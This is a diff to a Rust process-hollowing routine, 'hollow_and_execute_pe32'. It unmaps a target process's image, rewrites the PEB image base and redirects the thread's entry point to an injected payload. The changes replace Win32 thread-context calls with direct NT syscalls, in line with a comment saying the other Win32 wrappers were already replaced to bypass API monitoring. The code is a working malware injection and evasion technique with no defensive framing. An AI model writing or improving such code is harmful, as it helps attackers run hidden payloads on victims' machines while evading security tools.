@@ -847,8 +847,6 @@ unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
         IMAGE_NT_OPTIONAL_HDR32_MAGIC, IMAGE_NT_SIGNATURE, MEM_COMMIT, MEM_RESERVE,
         PAGE_READWRITE, WOW64_CONTEXT, WOW64_CONTEXT_FULL,
     };
-    use winapi::um::wow64apiset::{Wow64GetThreadContext, Wow64SetThreadContext};
-
     // NtClose for handle cleanup.
     macro_rules! close_handle {
         ($h:expr) => {
@@ -926,40 +924,43 @@ unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
     };
 
     // Hollow original image via NtUnmapViewOfSection when possible.
-    // Use Wow64GetThreadContext to read the 32-bit PEB address (Ebx in WOW64 initial context).
-    // NOTE: Wow64GetThreadContext / Wow64SetThreadContext are unresolved in the current
-    // winapi version used by this crate (pre-existing issue) — the PE32 path is currently
-    // non-functional on those calls; all other Win32 wrappers have been replaced with NT APIs.
+    // Read the 32-bit PEB address (Ebx in WOW64 initial context) via NT direct syscall.
     {
         let mut ctx: WOW64_CONTEXT = zeroed();
         ctx.ContextFlags = WOW64_CONTEXT_FULL;
-        if Wow64GetThreadContext(h_thread, &mut ctx) == 0 {
-            tracing::warn!(
-                "hollow_and_execute(pe32): Wow64GetThreadContext failed; skipping unmap");
-        } else {
-            let peb_ptr = ctx.Ebx as usize as *const u8;
-            let mut remote_image_base: u32 = 0;
-            let mut rd: usize = 0;
-            let _ = nt_syscall::syscall!(
-                "NtReadVirtualMemory",
-                h_process as u64, peb_ptr.add(0x8) as u64,
-                &mut remote_image_base as *mut _ as u64,
-                std::mem::size_of::<u32>() as u64,
-                &mut rd as *mut _ as u64,
-            );
-            if remote_image_base == 0 {
-                tracing::warn!(
-                    "hollow_and_execute(pe32): remote_image_base is NULL; skipping unmap");
-            } else {
-                let us = nt_syscall::syscall!(
-                    "NtUnmapViewOfSection",
-                    h_process as u64, remote_image_base as u64,
-                ).unwrap_or(-1);
-                if us < 0 {
+        let get_ctx_status = nt_syscall::syscall!(
+            "NtGetContextThread", h_thread as u64, &mut ctx as *mut _ as u64,
+        );
+        match get_ctx_status {
+            Ok(s) if s >= 0 => {
+                let peb_ptr = ctx.Ebx as usize as *const u8;
+                let mut remote_image_base: u32 = 0;
+                let mut rd: usize = 0;
+                let _ = nt_syscall::syscall!(
+                    "NtReadVirtualMemory",
+                    h_process as u64, peb_ptr.add(0x8) as u64,
+                    &mut remote_image_base as *mut _ as u64,
+                    std::mem::size_of::<u32>() as u64,
+                    &mut rd as *mut _ as u64,
+                );
+                if remote_image_base == 0 {
                     tracing::warn!(
-                        "hollow_and_execute(pe32): NtUnmapViewOfSection NTSTATUS {:#010x}; continuing",
-                        us as u32);
+                        "hollow_and_execute(pe32): remote_image_base is NULL; skipping unmap");
+                } else {
+                    let us = nt_syscall::syscall!(
+                        "NtUnmapViewOfSection",
+                        h_process as u64, remote_image_base as u64,
+                    ).unwrap_or(-1);
+                    if us < 0 {
+                        tracing::warn!(
+                            "hollow_and_execute(pe32): NtUnmapViewOfSection NTSTATUS {:#010x}; continuing",
+                            us as u32);
+                    }
                 }
+            }
+            _ => {
+                tracing::warn!(
+                    "hollow_and_execute(pe32): NtGetContextThread failed; skipping unmap");
             }
         }
     }
@@ -1057,22 +1058,37 @@ unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
 
     let mut ctx: WOW64_CONTEXT = zeroed();
     ctx.ContextFlags = WOW64_CONTEXT_FULL;
-    if Wow64GetThreadContext(h_thread, &mut ctx) == 0 {
-        tracing::warn!(
-            "hollow_and_execute(pe32): Wow64GetThreadContext failed before PEB image-base update; skipping PEB write");
-    } else {
-        let peb_ptr = ctx.Ebx as usize as *const u8;
-        let _ = nt_syscall::syscall!(
-            "NtWriteVirtualMemory",
-            h_process as u64, peb_ptr.add(0x8) as u64,
-            &remote_base32 as *const _ as u64,
-            std::mem::size_of::<u32>() as u64,
-            &mut written as *mut _ as u64,
-        );
+    let get_ctx_status = nt_syscall::syscall!(
+        "NtGetContextThread", h_thread as u64, &mut ctx as *mut _ as u64,
+    );
+    match get_ctx_status {
+        Ok(s) if s >= 0 => {
+            let peb_ptr = ctx.Ebx as usize as *const u8;
+            let _ = nt_syscall::syscall!(
+                "NtWriteVirtualMemory",
+                h_process as u64, peb_ptr.add(0x8) as u64,
+                &remote_base32 as *const _ as u64,
+                std::mem::size_of::<u32>() as u64,
+                &mut written as *mut _ as u64,
+            );
 
-        ctx.Eax = remote_base32.wrapping_add(entry_point_rva as u32);
-        if Wow64SetThreadContext(h_thread, &ctx) == 0 {
-            tracing::warn!("hollow_and_execute(pe32): Wow64SetThreadContext failed; continuing");
+            ctx.Eax = remote_base32.wrapping_add(entry_point_rva as u32);
+            let set_ctx_status = nt_syscall::syscall!(
+                "NtSetContextThread", h_thread as u64, &ctx as *const _ as u64,
+            );
+            if let Err(e) = set_ctx_status {
+                tracing::warn!("hollow_and_execute(pe32): NtSetContextThread failed: {}", e);
+            } else if let Ok(s2) = set_ctx_status {
+                if s2 < 0 {
+                    tracing::warn!(
+                        "hollow_and_execute(pe32): NtSetContextThread NTSTATUS {:#010x}; continuing",
+                        s2 as u32);
+                }
+            }
+        }
+        _ => {
+            tracing::warn!(
+                "hollow_and_execute(pe32): NtGetContextThread failed before PEB image-base update; skipping PEB write");
         }
     }
 
